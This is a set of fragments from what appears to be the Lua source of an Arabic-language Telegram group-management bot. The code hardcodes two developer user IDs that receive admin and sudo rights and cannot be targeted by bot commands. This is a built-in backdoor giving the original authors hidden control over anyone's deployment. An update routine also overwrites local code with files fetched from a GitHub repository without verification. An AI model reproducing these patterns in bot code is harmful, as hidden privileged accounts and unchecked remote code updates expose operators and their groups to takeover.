...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1360358971 or msg.sender_user_id_ == 1733998206 then 
Adminn = true
...
download_file('https://raw.githubusercontent.com/TMLANA/LANA/master/inc/Run.lua','./inc/Run.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'40% - |█████       |') end
download_file('https://raw.githubusercontent.com/TMLANA/LANA/master/inc/locks.lua','./inc/locks.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'60% - |███████     |') end
download_file('https://raw.githubusercontent.com/TMLANA/LANA/master/inc/Script.lua','./inc/Script.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'80% - |█████████   |') end
download_file('https://raw.githubusercontent.com/TMLANA/LANA/master/inc/functions.lua','./inc/functions.lua')
...
result = false
if msg.sender_user_id_ == 1360358971 or msg.sender_user_id_ == 1733998206 then 
SudoBase = true
...
var = 'هذا البوت 🙄☝🏿' 
elseif UserID == 1360358971 or UserID == 1733998206  then 
var = 'مطور السورس'
...
if UserID == 1360358971 or UserID == 1733998206 then return sendMsg(ChatID,MsgID,"- لا يمكنك تنفيذ الامر ضد مطور السورس ❕") end
